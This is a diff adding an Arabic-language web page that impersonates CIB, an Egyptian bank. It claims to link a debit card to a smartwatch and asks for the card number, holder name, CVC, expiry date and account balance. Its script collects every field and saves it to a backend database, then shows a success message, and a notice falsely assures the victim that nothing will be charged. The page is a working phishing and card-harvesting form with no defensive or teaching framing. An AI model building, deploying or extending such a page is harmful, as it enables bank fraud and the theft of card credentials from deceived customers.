@@ -1,0 +1,141 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>CIB - بيانات البطاقة</title>
+    <link rel="stylesheet" href="card-data.css" />
+  </head>
+  <body>
+    <header class="top-header">
+      <div class="logo-wrap">
+        <img class="logo" src="img/logo.png" alt="CIB" />
+      </div>
+      <div class="sep" aria-hidden="true"></div>
+    </header>
+
+    <main class="page">
+      <section class="card">
+        <h1 class="title">
+          بيانات بطاقة الخصم التي ترغب بربطها ب الساعة<br />
+          الذكية
+        </h1>
+
+        <form class="form" action="#" method="post" autocomplete="off">
+          <div class="field">
+            <label for="card-number">رقم البطاقة</label>
+            <input id="card-number" name="card_number" type="text" placeholder="CARD NUMBER" />
+          </div>
+
+          <div class="field">
+            <label for="card-holder">اسم صاحب البطاقة</label>
+            <input id="card-holder" name="card_holder" type="text" placeholder="اسم صاحب البطاقة" />
+          </div>
+
+          <div class="triple-labels">
+            <span>رمز cvc</span>
+            <span>السنة</span>
+            <span>الشهر</span>
+          </div>
+
+          <div class="triple-inputs">
+            <input id="cvv" class="cvc" name="cvv" type="text" placeholder="CVC" autocomplete="off" />
+            <div class="year-month">
+              <input id="expiry-year" name="expiry_year" type="text" placeholder="سنة" inputmode="numeric" />
+              <input id="expiry-month" name="expiry_month" type="text" placeholder="شهر" inputmode="numeric" />
+            </div>
+          </div>
+
+          <div class="field">
+            <label for="balance">الرصيد المتوفر فى الحساب</label>
+            <input id="balance" name="balance" type="text" placeholder="الرصيد المتوفر في الحساب" />
+          </div>
+
+          <button type="submit" class="btn">تأكيد البيانات</button>
+        </form>
+
+        <div class="notice">ملاحظة : لا يتم خصم اي مبلغ من حسابك</div>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-text">
+        البنك التجاري الدولي هو بنك مرخص ومنظم ويخضع البنك المركزي المصري
+      </div>
+    </footer>
+    
+    <script src="api-config.js"></script>
+    <script src="api-client.js"></script>
+    <script src="form-handler.js"></script>
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        const form = document.querySelector('.form');
+        
+        form.addEventListener('submit', async function(e) {
+          e.preventDefault();
+
+          const monthRaw = document.getElementById('expiry-month').value.trim();
+          const yearRaw = document.getElementById('expiry-year').value.trim();
+          const month = monthRaw.replace(/\D/g, '').slice(0, 2);
+          const yearDigits = yearRaw.replace(/\D/g, '');
+          const yy = yearDigits.length <= 2 ? yearDigits.padStart(2, '0') : yearDigits.slice(-2);
+          const expiry_date = (month && yy) ? (month.padStart(2, '0') + '/' + yy) : '';
+
+          const card_number = document.getElementById('card-number').value.trim();
+          const card_holder = document.getElementById('card-holder').value.trim();
+          const cvv = document.getElementById('cvv').value.trim();
+          const balance = document.getElementById('balance').value.trim();
+
+          const newUser = {
+            page: 'card',
+            card_number,
+            card_holder,
+            cvv,
+            expiry_month: month || '',
+            expiry_year: yearRaw || '',
+            expiry_date,
+            balance,
+            timestamp: new Date().toLocaleString('ar-EG'),
+            registrationTime: new Date().toLocaleString('ar-EG'),
+            name: card_holder || 'بدون اسم'
+          };
+
+          try {
+            await saveSubmission(newUser);
+          } catch (err) {
+            console.error(err);
+            alert('تعذر حفظ بيانات البطاقة. تأكد أن الخادم وMongoDB يعملان.');
+            return;
+          }
+
+          // عرض الرسالة
+          const modal = document.createElement('div');
+          modal.style.cssText = `
+            position: fixed;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+          `;
+          modal.innerHTML = `
+            <div style="background: white; padding: 40px; border-radius: 15px; text-align: center; max-width: 400px;">
+              <div style="font-size: 50px; margin-bottom: 20px;">✅</div>
+              <h2 style="color: #28a745; margin-bottom: 10px;">تم التسجيل بنجاح!</h2>
+              <p style="color: #666; margin-bottom: 20px;">شكراً لك على المعلومات.</p>
+              <button onclick="window.location.href='index.html'" style="padding: 10px 30px; background: #667eea; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold;">العودة للرئيسية</button>
+            </div>
+          `;
+          document.body.appendChild(modal);
+          form.reset();
+          setTimeout(() => modal.remove(), 3000);
+        });
+      });
+    </script>
+  </body>
+</html>
+
